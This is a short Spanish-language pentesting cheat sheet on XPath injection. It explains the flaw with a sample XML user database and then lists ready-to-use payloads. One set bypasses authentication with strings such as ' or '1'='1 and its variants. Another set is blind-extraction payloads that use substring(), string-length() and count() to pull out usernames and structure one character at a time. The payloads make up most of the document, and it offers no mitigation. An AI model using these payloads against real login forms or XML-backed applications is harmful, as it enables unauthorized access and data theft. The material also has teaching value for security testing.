---
icon: database
---

# XPath Injection

XPath se usa para consultar documentos XML (a veces como base de datos). Si el input se incorpora directamente en una expresión XPath, se puede manipular la lógica.

```xml
<!-- XML de usuarios (base de datos) -->
<users>
  <user><name>admin</name><password>secret</password></user>
  <user><name>user1</name><password>pass1</password></user>
</users>

<!-- Consulta XPath normal -->
//user[name='admin' and password='secret']

<!-- Con inyección en password -->
' or '1'='1
→ //user[name='admin' and password='' or '1'='1']
→ Devuelve todos los usuarios (siempre true)
```

#### Bypass de autenticación XPath

```bash
# En campo de username o password
' or '1'='1                     # Siempre true
' or '1'='1'--                  # Con comentario
' or ''='                       # Empty string = empty string
'or 1=1 or ''='                 # Alternativa
') or ('1'='1                   # Con paréntesis
admin' or '1'='1                # Con username conocido
' or name()='user               # Alternativa
```

#### Extracción de datos (blind XPath)

```bash
# Usando string-length() y substring() para extraer datos carácter a carácter
# ¿El primer carácter del nombre del primer usuario es 'a'?
' or substring(//user[1]/name,1,1)='a' or '1'='2

# ¿La longitud del nombre del primer usuario es mayor que 3?
' or string-length(//user[1]/name)>3 or '1'='2

# Extraer número de usuarios
' or count(//user)>0 or '1'='2

# Extraer nombres de todos los nodos (enumerar el XML)
' or count(/*)>0 or '1'='2      # Nodos raíz
' or name(/*)='users' or '1'='2 # Nombre del nodo raíz
```
